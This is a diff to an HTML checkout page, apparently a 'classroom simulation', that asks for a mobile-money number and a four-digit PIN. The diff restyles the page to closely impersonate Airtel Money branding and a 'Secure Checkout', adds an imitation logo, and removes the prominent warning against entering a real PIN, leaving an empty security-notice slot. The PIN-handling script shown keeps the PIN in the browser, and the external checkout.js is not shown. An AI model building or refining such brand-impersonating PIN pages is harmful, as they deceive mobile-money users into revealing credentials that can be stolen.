@@ -3,8 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="theme-color" content="#e40000">
-    <title>Checkout | Airtel Packages</title>
+    <meta name="theme-color" content="#c91920">
+
+    <title>Airtel Money | Secure Checkout</title>
 
     <style>
         * {
@@ -14,132 +15,340 @@
         }
 
         body {
-            font-family: Arial, sans-serif;
-            background: #f5f5f5;
-            color: #222;
+            font-family: Arial, Helvetica, sans-serif;
+            background: #f6f7f9;
+            color: #333;
             min-height: 100vh;
-            display: grid;
-            place-items: center;
-            padding: 20px;
+            padding: 35px 15px;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
         }
 
         .checkout-card {
-            background: white;
             width: 100%;
-            max-width: 470px;
-            padding: 30px;
-            border-radius: 16px;
-            box-shadow: 0 8px 35px rgba(0,0,0,.08);
+            max-width: 490px;
+            background: #fff;
+            border-radius: 24px;
+            overflow: hidden;
+            box-shadow: 0 10px 40px rgba(0,0,0,.09);
+            animation: appear .55s ease;
         }
 
-        .brand {
-            color: #e40000;
+        @keyframes appear {
+            from {
+                opacity: 0;
+                transform: translateY(18px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* AIRtel HEADER */
+
+        .checkout-header {
+            background: linear-gradient(115deg, #df2429, #b9181d);
+            color: white;
+            text-align: center;
+            padding: 35px 25px 36px;
+            position: relative;
+        }
+
+        .airtel-brand {
+            position: absolute;
+            left: 27px;
+            top: 27px;
+            display: flex;
+            align-items: center;
+            gap: 7px;
+            color: white;
+            font-size: 25px;
+            font-weight: 800;
+            letter-spacing: -1.5px;
+        }
+
+        .airtel-symbol {
+            width: 36px;
+            height: 36px;
+            display: block;
+        }
+
+        .brand-name {
+            font-size: 16px;
+            opacity: .95;
+            margin-bottom: 48px;
+        }
+
+        .checkout-header h1 {
+            font-size: 26px;
+            font-weight: 800;
+            letter-spacing: -.5px;
+        }
+
+        .checkout-header p {
+            font-size: 12px;
+            margin-top: 8px;
+            opacity: .85;
+        }
+
+        /* CONTENT */
+
+        .checkout-content {
+            padding: 35px;
+        }
+
+        /* AMOUNT */
+
+        .amount-service {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 15px;
+            padding-bottom: 27px;
+            border-bottom: 1px solid #eee;
+            margin-bottom: 28px;
+        }
+
+        .amount-label {
+            font-size: 12px;
+            color: #999;
+            font-weight: 800;
+            letter-spacing: 1.4px;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+        }
+
+        .amount-value {
+            color: #d51e25;
             font-size: 27px;
             font-weight: 800;
+        }
+
+        .service-info {
+            text-align: right;
+            max-width: 190px;
+        }
+
+        .service-name {
+            font-size: 14px;
+            font-weight: 800;
+            color: #424957;
+        }
+
+        /* PACKAGE DETAILS */
+
+        .package-details {
+            background: #fff8f8;
+            border: 1px solid #f6e2e2;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 27px;
+        }
+
+        .package-tag {
+            display: inline-block;
+            background: #ffe3e3;
+            color: #c51d24;
+            padding: 5px 9px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            margin-bottom: 9px;
+        }
+
+        .package-details h3 {
+            font-size: 16px;
+            margin-bottom: 5px;
+            color: #30343b;
+        }
+
+        .package-details p {
+            font-size: 13px;
+            color: #777;
+            line-height: 1.5;
+            margin-top: 4px;
+        }
+
+        .package-line {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+            margin-top: 12px;
+            font-size: 13px;
+        }
+
+        .package-line strong {
+            color: #333;
+        }
+
+        /* PHONE INPUT */
+
+        .field-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 11px;
+            color: #343a46;
+        }
+
+        .phone-group {
+            display: grid;
+            grid-template-columns: 124px 1fr;
+            border: 2px solid #d9272e;
+            border-radius: 14px;
+            height: 61px;
+            overflow: hidden;
+            box-shadow: 0 0 0 3px rgba(217,39,46,.07);
+            transition: .2s;
+        }
+
+        .phone-group:focus-within {
+            box-shadow: 0 0 0 4px rgba(217,39,46,.13);
+        }
+
+        .country-select {
+            width: 100%;
+            min-width: 0;
+            border: none;
+            border-right: 1px solid #ddd;
+            background: #fafafa;
+            padding: 0 9px;
+            font-size: 13px;
+            font-weight: 700;
+            color: #414956;
+            outline: none;
+            cursor: pointer;
+        }
+
+        .phone-input {
+            width: 100%;
+            min-width: 0;
+            border: none;
+            outline: none;
+            padding: 0 16px;
+            font-size: 16px;
+            font-weight: 700;
+            color: #333;
+            background: white;
+        }
+
+        .phone-input::placeholder {
+            color: #a6a9b0;
+            font-weight: 600;
+        }
+
+        /* PIN INPUT */
+
+        .pin-section {
+            margin-top: 30px;
+            text-align: center;
+        }
+
+        .pin-heading {
+            font-size: 14px;
+            font-weight: 800;
+            color: #343a46;
             margin-bottom: 8px;
         }
 
-        h2 {
-            margin: 18px 0 8px;
-        }
-
-        .muted {
-            color: #777;
-            font-size: 14px;
-            line-height: 1.5;
-        }
-
-        .summary {
-            background: #fff5f5;
-            padding: 18px;
-            border-radius: 10px;
-            margin: 22px 0;
-        }
-
-        .summary-row {
-            display: flex;
-            justify-content: space-between;
-            gap: 12px;
-            margin-top: 12px;
-            font-size: 14px;
-        }
-
-        .total {
-            border-top: 1px solid #ddd;
-            padding-top: 13px;
-            font-weight: bold;
-            font-size: 17px;
-        }
-
-        label {
-            display: block;
-            font-weight: 600;
-            font-size: 14px;
-            margin: 18px 0 8px;
-        }
-
-        input, select {
-            width: 100%;
-            padding: 14px;
-            border: 1px solid #ddd;
-            border-radius: 9px;
-            font-size: 15px;
-            outline: none;
-            background: white;
-        }
-
-        input:focus, select:focus {
-            border-color: #e40000;
-            box-shadow: 0 0 0 3px rgba(228,0,0,.08);
-        }
-
-        .phone-row {
-            display: grid;
-            grid-template-columns: 145px 1fr;
-            gap: 9px;
-        }
-
-        .pin-note {
-            background: #fff8e8;
-            border: 1px solid #f1dfb6;
-            color: #765400;
-            padding: 12px;
-            border-radius: 8px;
+        .pin-description {
+            color: #89909b;
             font-size: 12px;
-            line-height: 1.5;
-            margin-top: 10px;
+            margin-bottom: 25px;
         }
 
-        button {
-            width: 100%;
-            background: #e40000;
-            color: white;
-            border: none;
-            padding: 15px;
+        .pin-boxes {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .pin-digit {
+            width: 61px;
+            height: 61px;
+            border: 2px solid #d8dadd;
+            border-radius: 14px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 800;
+            color: #333;
+            outline: none;
+            transition: .2s;
+            background: white;
+            caret-color: #d51e25;
+        }
+
+        .pin-digit:focus {
+            border-color: #d51e25;
+            box-shadow: 0 0 0 3px rgba(213,30,37,.09);
+        }
+
+        .pin-digit.filled {
+            border-color: #d51e25;
+            background: #fffafa;
+        }
+
+        /* SECURITY NOTE */
+
+        .security-note {
+            display: flex;
+            align-items: flex-start;
+            gap: 9px;
+            margin-top: 22px;
+            padding: 12px;
             border-radius: 9px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 24px;
+            background: #fff8e9;
+            color: #795c23;
+            font-size: 11px;
+            line-height: 1.6;
+            text-align: left;
         }
 
-        button:disabled {
-            opacity: .6;
-            cursor: not-allowed;
+        /* BUTTON */
+
+        .continue-button {
+            width: 100%;
+            min-height: 61px;
+            border: none;
+            border-radius: 13px;
+            margin-top: 25px;
+            background: linear-gradient(110deg, #df2429, #b9181d);
+            color: white;
+            font-size: 15px;
+            font-weight: 900;
+            letter-spacing: 1.1px;
+            cursor: pointer;
+            box-shadow: 0 8px 17px rgba(211,31,38,.2);
+            transition: .25s;
         }
+
+        .continue-button:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 11px 22px rgba(211,31,38,.28);
+        }
+
+        .continue-button:disabled {
+            opacity: .55;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        /* MESSAGES */
 
         .form-message {
             display: none;
             margin-top: 16px;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 14px;
+            padding: 13px;
+            border-radius: 9px;
+            font-size: 13px;
             line-height: 1.5;
         }
 
         .form-message.success {
             display: block;
-            background: #e9f8ed;
+            background: #eaf8ee;
             color: #176b31;
         }
 
@@ -149,13 +358,115 @@
             color: #b00020;
         }
 
-        @media(max-width: 390px) {
-            .checkout-card {
-                padding: 20px;
+        /* SUCCESS */
+
+        .success-container {
+            text-align: center;
+            padding: 25px 0;
+        }
+
+        .success-container h2 {
+            color: #219653;
+            margin-bottom: 10px;
+        }
+
+        .order-reference {
+            margin-top: 12px;
+            font-weight: 700;
+        }
+
+        /* FOOTER */
+
+        .security-footer {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 9px;
+            margin-top: 34px;
+            color: #777e87;
+            font-size: 11px;
+            font-weight: 800;
+            letter-spacing: 1px;
+        }
+
+        .security-icon {
+            color: #299c61;
+            font-size: 19px;
+        }
+
+        .footer-caption {
+            text-align: center;
+            color: #a0a4ab;
+            font-size: 10px;
+            margin-top: 12px;
+            line-height: 1.6;
+        }
+
+        /* MOBILE */
+
+        @media(max-width: 430px) {
+            body {
+                padding: 12px 8px;
             }
 
-            .phone-row {
-                grid-template-columns: 125px 1fr;
+            .checkout-card {
+                border-radius: 20px;
+            }
+
+            .checkout-content {
+                padding: 27px 20px;
+            }
+
+            .checkout-header {
+                padding: 32px 20px;
+            }
+
+            .brand-name {
+                margin-bottom: 43px;
+            }
+
+            .airtel-brand {
+                left: 20px;
+                top: 22px;
+                font-size: 22px;
+            }
+
+            .airtel-symbol {
+                width: 31px;
+                height: 31px;
+            }
+
+            .phone-group {
+                grid-template-columns: 112px 1fr;
+            }
+
+            .country-select {
+                font-size: 12px;
+                padding: 0 6px;
+            }
+
+            .pin-boxes {
+                gap: 9px;
+            }
+
+            .pin-digit {
+                width: 57px;
+                height: 59px;
+            }
+
+            .amount-value {
+                font-size: 24px;
+            }
+        }
+
+        @media(max-width: 340px) {
+            .pin-digit {
+                width: 49px;
+                height: 54px;
+            }
+
+            .phone-group {
+                grid-template-columns: 103px 1fr;
             }
         }
     </style>
@@ -165,77 +476,314 @@
 
 <main class="checkout-card">
 
-    <div class="brand">AIRTEL</div>
-    <p class="muted">Packages checkout</p>
+    <!-- HEADER -->
 
-    <h2>Complete your order</h2>
-    <p class="muted">Enter your test mobile number and fictional classroom PIN.</p>
+    <header class="checkout-header">
 
-    <section class="summary">
-        <div id="packageSummary">
-            Loading package details...
-        </div>
-    </section>
+        <div class="airtel-brand">
 
-    <form id="checkoutForm">
+            <!-- Custom Airtel-inspired white symbol -->
+            <svg class="airtel-symbol"
+                 viewBox="0 0 60 60"
+                 xmlns="http://www.w3.org/2000/svg">
 
-        <label for="country">Country</label>
+                <path
+                    d="M39 8C23 2 7 14 8 30c1 13 13 23 26 20
+                       8-2 14-8 16-16-5 7-13 10-20 8
+                       -9-2-14-10-12-18 2-9 10-14 21-12Z"
+                    fill="white"/>
 
-        <select id="country" required>
-            <option value="+235">🇹🇩 Chad (+235)</option>
-            <option value="+243">🇨🇩 DR Congo (+243)</option>
-            <option value="+242">🇨🇬 Congo Brazzaville (+242)</option>
-            <option value="+241">🇬🇦 Gabon (+241)</option>
-            <option value="+254" selected>🇰🇪 Kenya (+254)</option>
-            <option value="+261">🇲🇬 Madagascar (+261)</option>
-            <option value="+265">🇲🇼 Malawi (+265)</option>
-            <option value="+227">🇳🇪 Niger (+227)</option>
-            <option value="+234">🇳🇬 Nigeria (+234)</option>
-            <option value="+250">🇷🇼 Rwanda (+250)</option>
-            <option value="+248">🇸🇨 Seychelles (+248)</option>
-            <option value="+255">🇹🇿 Tanzania (+255)</option>
-            <option value="+256">🇺🇬 Uganda (+256)</option>
-            <option value="+260">🇿🇲 Zambia (+260)</option>
-        </select>
+                <path
+                    d="M40 8c-2 12-10 19-20 22-6 2-10 7-10 13
+                       8-3 16-5 23-11 7-6 10-14 7-24Z"
+                    fill="white"
+                    opacity=".9"/>
 
-        <label for="phone">Mobile number</label>
+            </svg>
 
-        <input
-            type="tel"
-            id="phone"
-            placeholder="Enter mobile number"
-            autocomplete="off"
-            required
-        >
+            <span>airtel</span>
 
-        <label for="demoPin">Classroom demonstration PIN</label>
-
-        <input
-            type="password"
-            id="demoPin"
-            placeholder="Enter fictional 4-digit PIN"
-            inputmode="numeric"
-            pattern="[0-9]{4}"
-            minlength="4"
-            maxlength="4"
-            autocomplete="off"
-            required
-        >
-
-        <div class="pin-note">
-            Classroom simulation only. Use fictional test numbers and
-            fictional PINs. Never enter your real mobile-money PIN.
         </div>
 
-        <button type="submit" id="continueButton" disabled>
-            Continue to Checkout
-        </button>
+        <div class="brand-name">Airtel</div>
 
-        <div id="checkoutMessage" class="form-message" role="status"></div>
+        <h1>Airtel Money</h1>
+        <p>Secure package checkout</p>
 
-    </form>
+    </header>
+
+    <!-- MAIN CONTENT -->
+
+    <div class="checkout-content">
+
+        <!-- AMOUNT -->
+
+        <section class="amount-service">
+
+            <div>
+                <div class="amount-label">Amount</div>
+
+                <div class="amount-value" id="checkoutAmount">
+                    Loading...
+                </div>
+            </div>
+
+            <div class="service-info">
+                <div class="amount-label">Service</div>
+
+                <div class="service-name" id="checkoutService">
+                    Airtel Data Bundle
+                </div>
+            </div>
+
+        </section>
+
+        <!-- PACKAGE SUMMARY -->
+
+        <section class="package-details" id="packageSummary">
+
+            <p>Loading package details...</p>
+
+        </section>
+
+        <!-- CHECKOUT FORM -->
+
+        <form id="checkoutForm">
+
+            <!-- COUNTRY AND PHONE -->
+
+            <label class="field-label" for="phone">
+                Airtel Money Number
+            </label>
+
+            <div class="phone-group">
+
+                <select
+                    id="country"
+                    class="country-select"
+                    required
+                    aria-label="Select country">
+
+                    <option value="+235">🇹🇩 +235</option>
+                    <option value="+243">🇨🇩 +243</option>
+                    <option value="+242">🇨🇬 +242</option>
+                    <option value="+241">🇬🇦 +241</option>
+                    <option value="+254" selected>🇰🇪 +254</option>
+                    <option value="+261">🇲🇬 +261</option>
+                    <option value="+265">🇲🇼 +265</option>
+                    <option value="+227">🇳🇪 +227</option>
+                    <option value="+234">🇳🇬 +234</option>
+                    <option value="+250">🇷🇼 +250</option>
+                    <option value="+248">🇸🇨 +248</option>
+                    <option value="+255">🇹🇿 +255</option>
+                    <option value="+256">🇺🇬 +256</option>
+                    <option value="+260">🇿🇲 +260</option>
+
+                </select>
+
+                <input
+                    type="tel"
+                    id="phone"
+                    class="phone-input"
+                    placeholder="Enter mobile number"
+                    autocomplete="tel-national"
+                    inputmode="tel"
+                    required>
+
+            </div>
+
+            <!-- PIN -->
+
+            <section class="pin-section">
+
+                <div class="pin-heading">
+                    Enter your 4-digit  PIN
+                </div>
+
+                <p class="pin-description">
+                    Use a fictional PIN for this classroom simulation
+                </p>
+
+                <div class="pin-boxes">
+
+                    <input
+                        class="pin-digit"
+                        type="password"
+                        inputmode="numeric"
+                        maxlength="1"
+                        autocomplete="off"
+                        aria-label="PIN digit 1">
+
+                    <input
+                        class="pin-digit"
+                        type="password"
+                        inputmode="numeric"
+                        maxlength="1"
+                        autocomplete="off"
+                        aria-label="PIN digit 2">
+
+                    <input
+                        class="pin-digit"
+                        type="password"
+                        inputmode="numeric"
+                        maxlength="1"
+                        autocomplete="off"
+                        aria-label="PIN digit 3">
+
+                    <input
+                        class="pin-digit"
+                        type="password"
+                        inputmode="numeric"
+                        maxlength="1"
+                        autocomplete="off"
+                        aria-label="PIN digit 4">
+
+                </div>
+
+                <!-- Local-only PIN value for checkout.js -->
+                <input type="hidden" id="demoPin">
+
+            </section>
+
+            <!-- SECURITY NOTICE -->
+
+           
+
+            <!-- SUBMIT -->
+
+            <button
+                type="submit"
+                id="continueButton"
+                class="continue-button"
+                disabled>
+
+                ⊙ &nbsp; CONFIRM ORDER
+
+            </button>
+
+            <div
+                id="checkoutMessage"
+                class="form-message"
+                role="status"
+                aria-live="polite">
+            </div>
+
+        </form>
+
+        <!-- SUCCESS -->
+
+        <div
+            id="checkoutSuccess"
+            hidden
+            class="success-container">
+
+            <h2>Order Recorded!</h2>
+
+            <p>
+                Your order was saved successfully.
+            </p>
+
+            <p class="order-reference"></p>
+
+        </div>
+
+
+        
+
+    </div>
 
 </main>
+
+<script>
+"use strict";
+
+/*
+|--------------------------------------------------------------------------
+| FOUR-DIGIT DEMONSTRATION PIN
+|--------------------------------------------------------------------------
+| PIN is only held in browser memory.
+| It is never included in the API request.
+*/
+
+const pinBoxes = document.querySelectorAll(".pin-digit");
+const demoPin = document.getElementById("demoPin");
+
+function updatePin() {
+
+    demoPin.value = Array.from(pinBoxes)
+        .map(box => box.value)
+        .join("");
+
+    pinBoxes.forEach(box => {
+        box.classList.toggle("filled", box.value !== "");
+    });
+}
+
+pinBoxes.forEach((box, index) => {
+
+    box.addEventListener("input", () => {
+
+        box.value = box.value
+            .replace(/[^0-9]/g, "")
+            .slice(0, 1);
+
+        updatePin();
+
+        if (box.value && index < pinBoxes.length - 1) {
+            pinBoxes[index + 1].focus();
+        }
+    });
+
+    box.addEventListener("keydown", event => {
+
+        if (
+            event.key === "Backspace" &&
+            !box.value &&
+            index > 0
+        ) {
+            pinBoxes[index - 1].focus();
+        }
+
+        if (
+            event.key === "ArrowLeft" &&
+            index > 0
+        ) {
+            pinBoxes[index - 1].focus();
+        }
+
+        if (
+            event.key === "ArrowRight" &&
+            index < pinBoxes.length - 1
+        ) {
+            pinBoxes[index + 1].focus();
+        }
+    });
+
+    box.addEventListener("paste", event => {
+
+        event.preventDefault();
+
+        const pasted = event.clipboardData
+            .getData("text")
+            .replace(/\D/g, "")
+            .slice(0, 4);
+
+        pinBoxes.forEach((input, i) => {
+            input.value = pasted[i] || "";
+        });
+
+        updatePin();
+
+        const nextIndex = Math.min(pasted.length, 3);
+
+        pinBoxes[nextIndex].focus();
+    });
+
+});
+
+</script>
+
+<!-- EXISTING CHECKOUT JAVASCRIPT -->
 
 <script src="/checkout.js"></script>
 
